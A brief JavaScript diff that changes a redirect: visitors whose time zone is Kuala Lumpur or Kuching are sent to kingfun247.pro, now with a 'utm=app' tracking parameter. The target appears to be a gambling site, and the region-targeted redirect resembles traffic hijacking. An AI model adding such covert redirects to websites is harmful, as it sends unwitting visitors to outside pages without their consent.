@@ -9,5 +9,5 @@ if (
   userTimeZone === "Asia/Kuala_Lumpur" ||
   userTimeZone === "Asia/Kuching"
 ) {
-  window.location.href = "https://kingfun247.pro/";
+  window.location.href = "https://kingfun247.pro/?utm=app";
 }
